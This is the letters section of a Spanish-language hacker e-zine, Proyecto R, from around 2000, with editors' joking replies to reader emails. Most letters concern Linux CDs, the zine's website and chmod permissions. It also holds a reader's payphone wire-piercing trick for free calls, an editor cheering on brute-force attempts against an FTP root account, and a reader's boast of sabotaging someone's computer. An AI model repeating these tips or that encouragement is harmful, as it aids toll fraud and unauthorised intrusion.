Inicia tu navegacion en http://www.ya.com

[ Nex: ¿ Para esto  me molesto  yo en  ocultar los  mails de  la gente ?  que 
  ingratos... ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Mastroianni" <chocko@xxxxxx.com>
Subject:        	Dudas
Date sent:      	Sun, 28 May 2000 //:59:44 -1300

Hola,  ojala puedan  responder  estas dudas, y  por favor, respondanlas  a mi
correo, ya  que esperar a que salga  su proximo numero seria una locura ( por
lo menos para mi )

[ Nex: Este mail me suena .... ]

1) si  una persona  quiere tratar  de ingresar a  ftp por fuerza bruta con la
cuenta del  root y no  lo logra  ¿ el root  se da cuenta  que hubieron 321354
fallos de contrase~a ? 

[ Nex: Hmmm, vamos bajando el numero de intentos, date cuenta  que cuanto mas
  peque~o sea el  log, mas posibilidades  hay de que al admin no le de pereza
  leerlo. No te cortes! Fuerza bruta rlz! ]

2) ¿Algunos de ustedes no tiene un modem que le sirva a un 486 con linux suse
 5.1 para vender ? ( no importa su velocidad )

[ Nex: En la estanteria de la izquierda, ... si, justo esa,... para ti todo ]

psono+, ojala me respondan y sigan adelante !!!

[ Nex: Y te respondemos a los dos mails !!!, luego  te  quejaras  de  nuestra
  generosidad ... ]

Tu correo gratis en MixMail http://www.mixmail.com
Inicia tu navegacion en http://www.ya.com

[ Nex: Bah, ... reincidente ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 8 Jun 2000 02:41:02 -0400
From:           	Sebastian Elcano Santander <pillin@xxxxxx.cl>
Subject:        	donde esta la pagina web?

hola, hace  caleta de tiempo  que no te escribia, ya ni te  acorday de mi, en
fin, quisiera saber que que chuchas paso con proyecto R, sigue o no? 

[ Nex: No, hemos fallecido, esto que lees son palabras postumas. ]
[ Tkr:  De  hecho,  esto que estas leyendo nunca existio, son solo ilusiones,
  electronicas generadas por tu cerebro, todo con el fin de ... imaginalo...]

lo que  pasa es que tenia  la pagina en los favoritos  hace ene tiempo y tuve
que formatear  el computador (pa' variar) y lo perdi. existe en la actualidad
algun sitio para "el proyecto"?  o no? si la  respuesta  es si,  me mandas la
direccion? ok, sin mas  y agradeciendo su respuesta chaooo

[ Nex: Bah... es que responder en el zine es mas divertido, www.cdlr.org xD ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Emerson Casa Entel" <emersongt@xxxxxx.net>
Subject:        	Porpuesta
Date sent:      	Sun, 18 Jun 2000 21:59:47 -0400

Proyecto R:

[ Nex: Que ]

Espero que todavia sigan trabajando y no se hayan metido en problemas.

[ Nex: Este mail promete... ]
[ Tkr: Trabajando..??, bahhh, ya veo... te cantare mi himno: y dice..
  A mi  me  dicen  el  negrito del batey.... por que el trabajo para mi es un 
  enemigo,  el  trabajar  yo  se lo dejo todo al buey... porque el trabajo lo  
  hizo Dios como castigo...
  Pronto lo sacare en mp3 en alguna parte en www.cdlr.org XDDD ]

Tengo una proposicion para ustedes. 

[ Nex: ¿ Que te decia ? ]

Les gustaria seguir haciendo lo  mismo que hacen y mas  encima les pagen (una
no despreciable suma de dinero).

[ Nex: ¿ Bebidas gratis ????, donde hay que firmar ??? ]
[ Tkr: Donde estara el truco...???]

Junto con la  plata, existe  capacitacion,  salidas al extranjero  y bla blah
blah. Suena bonito, pero no es chiste. 

[ Nex: No me lo creo... esto parece una de esas cartas en cadena donde tienes
  que enviar una monedita con cada una, bah ... ]
[ Tkr: Mmmm, ahora que lo pienso, eso mismo le dijeron a AndyK hace un tiempo
  y hasta ahora no lo he vuelto a ver... :¿? ]

Si no existe ni un  interes respondame  igual y avisenme.  Realmente segun lo
que he leido (aunque no es  tan tan profundo)  es metodico y  profesional, es
decir se lo toman en serio y es por esi que los elegi.

[ Nex: Te entiendo, nosotros tenemos fama de serios ]
[ Tkr: Si, serios, alguien ha visto mi gato..???]

Espero Respuesta

[ Nex: Ya, como todos ... ]

Atte.
Silvestre.

[ Nex: Caballeros, el hacking no es un negocio. Si nosotros hacemos 'algo' es
  porque nos gusta y punto. Lo hacemos  porque creemos  en aquellas ideas tan
  pasadas de moda que hablaban de conocer mas  cosas, superacion,  investigar
  el sistema, ¿por que funcionan las cosas?, ...
  
  Dejen el negocio del hacking para los autenticos profesionales de seguridad
  informatica. Aqui, en este zine, en estos mails, estamos en otro lado; pero
  quien sabe si  tambien estamos  en esa  empresa de seguridad  que contratan
  para auditar sus maquinas, pero esos no son  ni Taker, ni Plaxius, ni Nexus
  ... esos otros son profesionales con  nombre y  apellidos. Aqui  solo somos
  handles.
  
  Se~ores, ... aprendan a distinguir ]
[ Tkr: Que es un handle..?? XDDD]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	5 Jul 00 15:17:20 ARST
From:           	"Mr.Nuk3m" <mr_nuk3m@xxxx.net>
Subject:        	Fat32 y Linux :(

Como anda gente ....
 Veo que han publicado una nota mia en Pr9 :)

[ Nex: Una 'peque~a' nota, si ... xD ]

 Les queria preguntar si siguen con el proyecto MKLinuxTeam ???

 Porque ando  buscando el  Linux RedHat  6.x que  puede  manejar  particiones
 FAT32. Estoy hablando del FIPS que  viene, no se en  que version, con en Red
 Hat 6.x y que puede manejar las particiones de Win98...

 Si disponen de  alguna version  digan a donde el  cd-rom virgen. Yo  soy  de
 Argentina. Tiene algun distribuidor en la Arg del MkLinuxTeam?? 

[ Nex: A ver, ... ¿quien lleva eso?, que levante la mano ... ]
[ Tkr: En  Argentina,  esta  o estaba Mate, pero tengo entendido que se iba a
  vivir al otro lado del charco... entonces no se... alguien se apunta...??, 
  igual seria mas rapido encontrarlo en la web.]

 Les  comento  que  cuando  ponga  el  site  On-Line,  va  a  funcionar  como
 Distro-Site de Proyecto R y de otras e-zines Ok :)

[ Nex: Pues menos mal, porque como tuvieramos que confiar en nuestra web para
  eso, .. xDD ]
[ Tkr: y por que me miran a mi..??? XD ]

 Un saludo y sigan asi...

 Mr. Nuk3m  <(= Editor de C.I.A Magazine =)>
 mr_nuk3m@xxxxxx.net

____________________________________________________________________
Get free email and a permanent address at http://www.netaddress.com/?N=1

[ Nex: Estos mensajes me estressan .... ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:  "sac11" <sac11@xxxxxxx.com>
To:    proyecto_R@bigfoot.com
CC to: proyecto_r@bigfoot.org.proyecto_r@bigfoot.net.proyecto_r@bigfoot.net

[ Nex: Chico previsor ]

Subject:        	colaborador
Date sent:      	Fri, 21 Jul 2000 0.:11:06 -1300

Hola ProYeCtO_R: 

[ Nex: Ho14 $4K11 ]

Soy espa~ol, me llamo (apodo) es _SAc 

[ Nex: Pues en mi carnet de identidad pone Nexus, que raro eres. ]
[ Tkr: Y yo soy Colombiano y me llamo (apodo) Taker.]

me encontrareis por el irc-hispano.org #hacking , #whe. 

[ Nex: No me digas que tenemos fans ahi ? ]
[ Tkr: Ahhh, un canal de Hack...!!! que bien, puedo entrar..???]

 Pues el caso es que  quiesiera saber si seguis en pie para colaborar. Soy el
 fundador de un gupo de hack aca en Espa~a el WhE y quisieramos colaborar con
 ustedes, y ya de paso podrian mandarme los  proyecto_r que  me falta que son
 el desde el 3 hasta alante. ç
 
[ Nex: Ah, bueno, si eres el fundador entonces si que puedes colaborar,  pero 
  se te olvido mandarnos una direccion postal donde enviarte los zines. Mejor
  nos escribes otra vez pero esta vez nos das los datos bien ]
[ Tkr: Buscalas en Zine Store...]
 
 Muchas gracias. Y espero su respuesta.

[ Nex: Es un placer! ]

Tu correo gratis en MixMail http://www.mixmail.com
Inicia tu navegacion en http://www.ya.com

[ Nex: Dios mio! esto es una plaga!!! ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"DARIO FRANCISCO PRADO" <dariusfranciscus@xxxxx.com>
Subject:        	pagina de interes
Date sent:      	Sat, 22 Jul 2000 01:09:46 GMT

http://phrack.infonexus.com/archive.html

[ Nex: Pues yo no te la cambio por www.persiankitty.com ]
[ Tkr: http://www.cdlr.org/texts/otros/todo/packet/files/index.html]

________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at http://www.hotmail.com

[ Nex: ¿ Es que ya nadie paga por tener un miserable mail ? ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	kanwei@xxxxxx.cl
Subject:        	Saludos
Date sent:      	Fri, 4 Aug 2000 14:50:56 -0500

Estimados Amigos:
Desde  hace bastante  tiempo he paseado  por internet  tratando  de encontrar
chilenos amantes  de  la  computacion  e  informatica,  y  la  semana  pasada
encontre,  en  la seccion  de amigos de  ezkracho, el  link a su  pagina. Sin
embargo no  he podido  visitarlos ya  que su direccion no es alcanzable, ¿Que
pasa...? ¿Se mudaron?, o quizas llege tarde y se disolvieron. (esto ultimo lo
lamentaria  mucho). Me  guataria seber  que  paso...  Felicitandolos  por  su
iniciativa. Atentamente,

Kanwei

[ Nex: Pues paso  de todo, y  por muchas razones hemos estado sin web durante 
  unos cuantos meses. Pero bueno, ahora ya tenemos de nuevo y todo va como la
  seda :) ]
[ Tkr: Otra vez me estan mirando a mi..??? ]

PD: No quise enviar encriptado el correo (PGP) ya que se trataba de un saludo
 afectuoso para Uds.

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"" <josegarridom@xxxxx.com>
Subject:        	MKLINUX TEAM
Date sent:      	Tue, 29 Aug 2000 19:11:36 CLT

Salu2 Proyecto R:				29/08/2000

Hace  relativamente  pocos dias  encontre sus  revistas  (1 semana) y me  han
parecido geniales. Por fin encontre  algo Chileno, y cerca  de vi~a  (stgo.),
por lo visto.

[ Nex: Sisi, segun bajas a mano derecha. ]

Con respecto al Proyecto  MKLINUX Team yo tengo una version original de LINUX
Redhat 5.2. Yo  puedo facilitar  el  CD  para que  lo  copien  tambien  puedo
conseguirme algun quemador para poder distribuir las copias.

[ Nex: A ver, ... que alguien se de por aludido en la trastiendaaaaa !!! ]
[ Tkr: Plax, podrias contactarlo, y enviarle un RedHat 6.0, ahh, y los que
  colombianos que necesiten copias, me pueden contactar.]

Esperando su pronta respuesta, me despido...

[ Nex: Pronta, pronta ... pues no,... pero al final merece la pena, hombre! ]


PD: El dia  28/08/2000 intente  ingresar en su home-page pero no  pude... que
pasa?

[ Nex: V. mail anterior ]
[ Tkr: Nooooo, otra vez noooo..!!!]

       ****************

PD2: Deseo  comunicarme  con mas  hack  y  wannabe´s  de vi~a, me  pueden dar
algunos e-mail para comuniarme con ellos y poder aprender mas sobre este tipo
de *educacion* ;-)

[ Nex: ¿Y si montamos una seccion de contactos en cdlr.org ? hmmm... phreaker
  experto en PBX's busca informatico autista  para ser introducido en el arte 
  del penetration  testing ... cracker  de sistemas  busca mujer hacker  para
  recibir lecciones de exaltacion de la sensibilidad ... ]
[ Tkr: Si, me gusta la idea..!!! XDD]

      ****************

PD3: Existe alguna forma de poder ayudar al equipo, ya sea con su home-page o
 algo por el estilo....

[ Nex: Con buenos articulos para la R ]
[ Tkr: Y  asi  ayudamos  para  que  salga  mas  seguido,  y para que nuestros 
  editores no se estresssssennnn..!!!, y Taker no renuncie a ser el editor, y
  Etc... Bahh, me acaban de informar que Taker ya Renuncio]

      ****************

PD4: Donde puedo conseguir el Programa John the Ripper, Haktek, Wardialer, 
phonetag, etc...

[ Nex: No te digo donde, pero te digo como, que mola mas: buscandolos ]
[ Tkr: En mi pagina, creo.. pero no me acuerdo la direccion... :¿? ]

La otra  vez me dieron un truco  para los telefonos publicos, no se que color
en especial, pero era el siguiente, aunque no lo he provado...

Se toma  el auricular y  en la parte  de abajo (por donde uno habla)  sale el
cable hacia la  maquina, lo que  teni que  hacer....... pero lo que teni  que
hacer, es tirar el cable bien fuerte y encontrar el  cable blanco,  cuando lo
tengas toma un alfiler y pinchaselo, esto  dara una se~al como de  ingreso de
moneda$ y podras conversar libremente.....

       ****************

Con respecto al mail que  envio Gonzalo de Loncoche con respecto a Regedit de
W95, les cuento que yo trabajo con esa plataforma y no encontre ese registro,
lo mas probable es que se trate de PGP. 
Donde lo encuentro? # que no sea en pgpi.com #

[ Nex: ¿ Y por que no de ahi ? ]

       ****************

Les envio algo asi como un  truco de regedit, para  cuando quieran  crear una
web-page  con  el  segundo  boton del  mouse  opc.  "Muevo", "Microsoft  HTML
Document x.x" no solo les aparezca <HTML></HTML>, me entiendo... al editar la
pagina y ver el codigo fuente ;-)

Solo ingresa en HKEY_CLASSES_ROOT/.html/htmlfile/ShelNew y ejecuta Data aqui 
aparecera algo como esto:

3C 48 54 4D 4C 3E 3C 54  <HTML></  <--- "Aqui ingresa el codigo"
48 54 4D 4C 3E		 HTML>

Solo debes escribir lo que quieres que aparezca....

        ****************

    LET`S HACK
_________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at http://www.hotmail.com.

Share information about yourself, create your own public profile at 
http://profiles.msn.com.

[ Nex: Se me estan acabando los comentarios ironicos para las firmas ... ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"" <josegarridom@xxxxxxx.com>
Subject:        	Explicacion Metodo Octal
Date sent:      	Mon, 04 Sep 2000 17:13:27 CLT

Hola a to2 nueva% :			04/09/2000

Estoy muy  entusiasmado  con el  Proyecto R desde que encontre la  revista en
i-net.

[ Nex: Tambien podia escribirnos alguien para insultarnos y eso...  no se, el
  morbo ]

Como consejo para su revista me gustaria decirles  que omitieran los acentos,
eso es todo.

[ Nex: ¿ Que acentos ? ]
[ Tkr: Que acentos..???]

Quisiera hacer un aporte para la revista que consiste en explicar una seccion
del R1 titulada:

[ Tkr: Ok, Adelante...]

	        *************************
        	* 5.- HACK en Accion    *
        	*       (Basico)        *
        	*        Parte I        *
        	*   y en GuindoZe 95 "  *
        	*************************

en el encabezado "Jugando con  el PHF", puede que a algunos  les haya quedado
una gran duda en relacion al Valor Octal, este es mi aporte:

[ Nex: Aporta, aporta... no sabia donde diablos meter estas lineas asi que no
  las meto en ningun lado y quedan como mail ]

 *************************

El  metodo  octal  es para usuarios  mas avanzados  (segun el texto  donde lo
extrai),  esta esta  basada en  usar tres  octetos, uno  para cada  grupo  de
permisos.

*******Nota: Esto tambien sirve en Linux ;-)******

[ Nex: Ejem!, ¿ y vale en windows ? ]

He aqui un cuadro explicativo:

ææææææææææææææææææææææææææææææææææææææææææææææææææ
æ Binario     Octal     Permisos     Descripcion æ
ææææææææææææææææææææææææææææææææææææææææææææææææææ
æ 000	      0	        ---	  ningun permiso æ
æ 001	      1         --x       ejecucion      æ
æ 010	      2         -w-       escritura      æ
æ 011	      3         -wx	  escri. y ejec. æ
æ 100	      4         r--       lectura        æ
æ 101         5         r-x       lect. y ejec.  æ
æ 110	      6         rw-       lect. y escri. æ
æ 111  	      7   	rwx       todos permisos æ
ææææææææææææææææææææææææææææææææææææææææææææææææææ

Si asi no les quedo tan claro como se suponia look los siguientes ejemplos:

* Ejemplo 1 *

chmod 700

7 = 111 = rwx : corresponde al propietario y tiene todos los permisos.
0 = 000 = --- : corresponde al grupo y no tiene ningun permiso.
0 = 000 = --- : corresponde al resto y tampoco tienen permisos.

* Ejemplo 2 *

chmod 543

5 = 101 = r-x : corresponde al propietario y tiene derecho de lectura y 
                ejecucion.

4 = 100 = r-- : corresponde al grupo y tiene solo derecho de lectura.

3 = 011 = -wx : corresponde al resto y tiene derecho a escritura y ejecucion.

Espero que con estos les haya quedado mas claro el asunto, entonces, dulces 
Hack.

***Nota: r= lectura; w= escritura; x= ejecucion***


          !!!VIVA EL PROYECTO MKLINUX TEAM¡¡¡

[ Nex: ¡¡¡¡ VIVA NOSOTROS !!!! ¡¡¡¡ SOMOS LA LECHE !!!! ]          

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Nykkro Damage" <nykkro_damage@xxxxxx.com>
Subject:        	Hola a todos
Date sent:      	Fri, 08 Sep 2000 23:00:00 CLT

Hola, chicos del Proyecto R:

junto con saludarlos, quiero contarles que soy un chico de 17 a~os, que desea
hacer una aclaracion.

[ Nex: El publico es tuyo ]

Hace  tiempo,  una persona  escribio  diciendo  que era  phreak, que se decia
dominicano y cuyo nick era Nykhro-Damage. Esta persona  uso fuerza bruta para
sacarme la password del correo electronico (y de paso rompio  la cerradura de
mi velador, porque ni se le ocurrio sacar la password desde Internet) y envio
e-mails  a lugares  donde se  profesa la  doctrina hacker,  como el  sitio de
Proyecto R.

[ Nex: ¿ Desde  cuando se  necesita  tener la  clave de un correo para enviar 
  mails desde el ? ]
[ Tkr: Eso, eso...]

Hace poco,  cuando lo pille, supo  lo que en  realidad significa mi nickname:
creo que aun no puede reparar  su computadora y todo por un  peque~o programa
que le quito  el arranque de su  computadora, y  que bloquee ademas  con  una
password en el BIOS. Como no  sabe sacar las  passwords (que cretino... creia
que me las iba a ganar) del  BIOS se quedo sin computadora y no ha  hecho mas
travesuras.

[ Nex: Oye, me estas dando miedo ... ]
[ Tkr: Vaya, me caia bien el muchacho, de hecho estaba convencido que todo lo
  que ofrecia era verdad... y ahora, quien defendernos...???]

Y como si fuera poco, es el responsable de que a cada rato a una amiga mia la
llamen por telefono desde la compa~ia timofonica preguntando por mi. ¿Es 
posible que el ser humano sea capaz de tama~a torpeza? Quiero aprovechar para
enviarle un saludo al que LEJOS debiera ser elegido el lamer del mes, me 
refiero a Dj-Tycho, un estupido que trato de ganarme en MI juego (y no es que
me las de de Zero Cool...) nadie sabe en que parte chatea, nadie sabe como el
papa le compro su computadora para navidad...

[ Nex: Bah,  pues  que envidia, ya podia mi papa comprarme un ordenador a mi, 
  porque ya me estoy  hartando  de tener  que editar el  zine en el  cyber de 
  abajo ... ]

Escribo esto porque no quiero que la revista Proyecto R  sea viciada por este
tipo de  personajes que  no hacen  mas que  estupidizar  la red,  haciendonos
darnos cuenta de  que somos  mucho mas  inteligentes de lo  que somos.  Si no
fuera  por estos  lamers que  meten la pata  en el  lugar que  no  deben,  la
comunidad  informatica  hacker seria totalmente segura y la informacion seria
un poco mas libre de lo que es.

[ Tkr: Y peligrosa...]

Van  por un buen  camino  y espero  contribuir con  algunas cosillas  para la
pagina.  Ojala que  no suceda  mas este tipo de cosas (y lamento haberme dado
cuenta tarde)  porque no hacen  mas que quitar prestigio a  una  revista bien
organizada, con variada informacion y que, para bien o para mal, es una buena
fuente de conocimientos.

[ Nex: Pues a mi ma~ana me va a dar una resaca de muerte .... ]

Nos vemos, y sigan asi

« .o0o. Nykkro+Damage .o0o. »

________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at http://www.xxxxxx.com.

[ Nex: Notese que he tapado la url ... ]

Share information about yourself, create your own public profile at 
http://profiles.msn.com.

[ Nex: Uffff, que stressssss ... ]
[ Tkr: Si todos los passwd que tienes, son igual de facil de crackear como el
  que utilizaron  para  ENVIAR  correos  a  tu  nombre, cuidate que crear los 
  perfiles alli... XDD ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	hackram@xxxxxxxxx.net
Subject:        	cdlr
Date sent:      	Sat, 15 Jul 2000 20:15:50 -0500

       HoLa  eN PRiMeR LuGaR FeLiSiTaRLoS.

mas alla les ban unos articulo.

 [ Nex: Es que no publicamos cualquier cosa ... ]
 [ Tkr: Vueno, y con esa hortografia menos.... XDDD ]
 
En segundo lugar quero preguntarles como  puedo entrar a su grupo  o staff (o
como se escriba ).

 [Tkr: Entrar  al  staff  es  facilisimo,  solo tienes que demostrar, que has
  logrado  entrar  a la red de Microsoft y  conseguir  el  codigo  fuente  de
  cualquiera de sus plataformas... Y no digas que ya nadie lo ha hecho.]

Tambien aprobecho de pedirles que me espliquen ese proyecto  que tienen el de
un  servidor  una cosa  asi creo  que se llama  RC5 - Bovine. No se  mucho de
hacking pero me empe~o en saver y espero que me acepten. (conste c que no uso
linux  pero  estoi  instalandolo)  (lo  que  pasa que  no  cacho como  mierda
particiono el disco sin perder la informacion que tenia en windows) (igual un
poco de flogera mio :-(        perdon    )

 [Tkr: Haz oido hablar de la copias de seguridad..???]

antes de comensar con los articulos les pido por  fa que no den mi  e-mail ni
nada de lo de que me quero inscribir en su staff.(por razon X).

 [Tkr: Ok... ;)]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Mon, 25 Sep 2000 14:27:49 -0400 (EDT)
From:           	NDR 113 <ndr113@xxxxxxx.com>
Subject:        	Saludos desde FYE

Saludos, que  les habia  pasado?  se les vio  desaperecidos durante  bastante

 [Tkr: Bueno,  esa  pregunta  es  facil  de  responder, trabajo, algo de vida 
  personal  "POR FIN", estudio, algo mas de vida personal, Alcohol..., en si,
  puras cosas sencillas. XDDD, ahhh, y tambien que andabamos sin servidor]

tiempo  a CDLR  y su web.  Escribo para  informar que  la web  de FYE  se  ha
actualizado, y cambiado de URL hacia www.350cc.com . En este web  como podran
ver si lo vivistan hemos tratado de  expandernos mas  alla de solo la  ezine,
para contruir poco a poco una web de seguridad informatica.

 [Tkr: Bueno, ya la he visto, sigan adelante.]

Saludos,

NDR113
350cc

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Daniel Jacobino" <volrath_site@xxxxxxxx.com>
Subject:        	desesperado
Date sent:      	Thu, 28 Sep 2000 21:03:57 -0200

holas soy un hacker ,pero muy basico y quiero pedirles algo:

He estado en la computacion desde los nueve a~os y nunca nadie me ha ense~ado
nada ,pero de a poco he ido aprendiendo y he logrado llegar a  acercarme cada
vez mas a lo que siempre me ha fascinado :el hacking , este tema me fascina y
siempre estoy leyendo manuales y cosas asi para ver si logro  acercarme a ser
un hacker  de verdad, pero  al no tener  nadie  que me ense~e se me  hace muy
dificil y de veras que  quiero ser un hacker. Yo se que lo mas seguro  es que
ustedes me digan no a lo que les quiero pedir por que hace mucho tiempo estoy
buscando  un hacker  que me  ense~e , pero siempre  me dicen "no". Ustedes no
saben lo agradecido  que estaria si ustedes  me ense~aran  hacking , pues por
ahora pertenezco  a un grupo, pero la  mayoria aun estan  aprendiendo en todo
caso esta es la pag: http://go.to/zonah

 [Tkr: Wait, wait, podrias definirme eso de hacker basico..???, porque  segun
  entiendo, los hackers, o son hackers, o no son hackers, esta es  una de las
  cosas que no me gusta... por ejemplo, no  se  puede  decir  medio  instale, 
  linux.. pues, o lo instalaste y funciona, o no lo terminaste, y no 
  funciona, por lo tanto, no lo instalaste.
  Ahora, este rollo de que llevas desde  los  9  a~os en la computacion, y lo
  que has  aprendido,  lo  haz  aprendido  solo,  pues,  felicitaciones... Yo
  tambien  hubiera  querido que mi PAPI me comprara un pc cuando tenia 9 a~os
  pero lo unico que consegui a esa edad, fue ********* ** ** ** y ya... so..
  y por ultimo, si llevas ya algunos a~os aprendiendo solo, por que ahora
  quieres que alguien se meta en tu vida a decirte como hacer las cosas..???]

bueno ojala que  alguien  de ustedes se  apiade de mi y  me ense~e  lo que me
ha fascinado desde hace tanto tiempo. de antemano muchas gracias bye

 [Tkr: Alguien se atreve..???]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	rodrigo_gonzalez@xxxxxx.cl
Subject:        	pregunta sobre "proyecto_r.reg"
Date sent:      	Mon, 2 Oct 2000 10:20:36 -0500

resulta que  yo hace algun  tiempo baje todos los textos del proyecto r desde
el pr1,  hasta el  pr8 con  la intencion  de  aprender  mas  sobre  seguridad
informatica. en el cual venia  incluido un archivo con  entradas de registro,
llamado "proyecto_r.reg" yo lo ejecute, se  agrego exitosamente el  registro,
pero una vez que reinicie el pc, no andubo mas, no me reconoce el disco duro,
por lo tanto no encuentra el sistema operativo, la BIOS a veces lo reconoce y
veces no. No encuentro forma para leer el HD,  no puedo ejecutar el scandisk,
ni el fdisk, ni chkdsk, nada, con nada puedo leerlo., ¿¿¿QUE HAGO??? necesito
recuperar  los  datos  del disco,  como lo  puedo hacer  agradeceria  que  me
ayudaran a  recuperar los  datos, no  me importa tener que formatearlo , pero
antes quiero los datos, que tengo en el!!!!!!!!!!!!!!

 [Tkr: Si, efectivamente eso era un virus, de hecho, cuando yo lo ejecute, mi
  mi abuela  fallecio,  mis  padres se separaron, me quede sin trabajo, hasta
  ahora "un a~o despues, no he  podido volver a utilizar mi pc, las teclas se
  traban, cuando de casualidad enciende,  no  hace  lo que yo quisiera, estoy
  desesperado, fui a consultar un brujo indio, y me  dijo que ese problema no
  tenia solucion... ya despues de tanto tiempo, me estoy  haciendo a la idea,
  y he decidido no confiar en nadie, y mucho menos en archivos con  extension
  "reg", y para sentar un precedente, deberias quejarte ante la asociacion de
  consumidores de tu pais... ahi te va la direccion..
  www.go-to-hell.org, ahh, y reclama de mi parte tambien.]

agradeceria me pudieran responder a mi correo

rodrigo_gonzalez@xxxxxx.cl
y con copia a 
zar@xxxxx.cl
8995356@xxxxxxx.cl
de antemano muchas gracias.

un newbie!! ;-)

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"theKondon theKondon" <the_kondon@xxxxxxx.com>
Subject:        	Proyecto R
Date sent:      	Wed, 04 Oct 2000 02:38:36 GMT

Que paso con proyecto R alguien podria responderme ´por favor

 [Tkr: Que paso de que..???
  han pasado muchas cosas, podrias ser mas explicito..???]

The Kondon

  [Nex: Tu handle me resulta familiar, ... ¿alguna noche salvaje, tal vez? ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Dj in Work & Skater" <x-files@xxxxxxx.cl>
To:             	<proyecto_r@bigfoot.com>
Subject:        	hola
Date sent:      	Tue, 10 Oct 2000 00:19:46 -0300

QUIERO SABER QUE ES UN HACKER Y COMO PUEDO LLEGAR A SERLO

 [Tkr:  No  quiero definir que es un hacker, pues como todos hemos visto, esa
  palabra tiene una connotacion filosofica grandisima, y cada vez que alguien
  la define, o  intenta  definirla,  hay  gente  que  se  siente herida en su
  interior, este estado (el sentirse herido), crea una reaccion  negativa  en
  su  persona, esta reaccion negativa puede desencadenar en violencia, y como
  no me gusta la violencia, mejor "NO DIGO NADA".
  Con respecto a la otra pregunta, pues sencillo, mucho estudio.]
  

OJALA ME PUEDAN RESPONDER 

CLAUDIO DIAZ 

DJ IN WORK

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Tue, 17 Oct 2000 06:05:01 -400
From:           	JOSE ALEJANDRO HUAIQUIN RICARDI <jhuaiqui@xxxxxxx.cl>
Subject:        	SOLO CONSULTAS...

NO SOY HACKER NI MUCHO MENOS UN LAMER,PERO ME INTERESA MUCHO SUS PROYECTOS EN
LA  RED, Y  TENGO  MUCHAS  DUDAS  DESPUES  DE LO QUE DIJO  PLAXIUS EN INFORME
ESPECIAL:

1-ESTAN A FAVOR DE QUE COBREN POR EL DERECHO A TENER UN DOMINIO .COM O .CL ?

 [Tkr: Segun mi opinion personal, si, si estoy de acuerdo en el cobro, eso si
  Las tarifas deberian ser un poco mas bajas...]

2- EXISTE ALGUNA FORMA  DE NO TENER QUE PAGAR, SIN SER UN EXPERTO COMO UDS. Y
TENER UNA PAGINA PROPIA NO COMERCIAL,SIN PROPAGANDAS,NI NOMBRES MUY EXTENSOS?

 [Tkr: Algun  experto  por  aqui..???,  si  tu tienes una casa, y hay alguien
  Interesado en ella, le cobrarias para que se  mudaran  alli..???  yo  si lo
  haria, aunque fuera una minima parte si lo haria. creo que eso responde  la
  pregunta... Y me pone en contra de muchos. I don't care.!!!]

3-Y POR ULTIMO CUANDO VAN A ALZAR SU PAGINA DE WINDOWS NT ?

 [Tkr: Pronto.... o como dicen en cine... Coming Soon...]

ESO ES TODO GRACIAS.

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Tue, 17 Oct 2000 18:38:27 -0700 (PDT)
From:           	"Mr. kl0nk Manson" <kl0nk@xxxxxx.com>
Subject:        	Ezine 1 de 0ri0n Team Venezuela

Saludos.

Quiero informarle que  0ri0n Team Venezuela  ha liberado su  primer  E-Zine y
pueden bajarlo de http://pleyades.sourceforge.net/go.php?ezine/0ri0n-1.zip

 [Tkr: Ok, muchas gracias]

P.D:  Si ustedes  deciden ser  mirror por favor colocarle al URL de bajada la
siguiente linea antes de su url: http://pleyades.sourceforge.net/go.php?

 [Tkr: Ok, gracias]

Por Ejemplo:
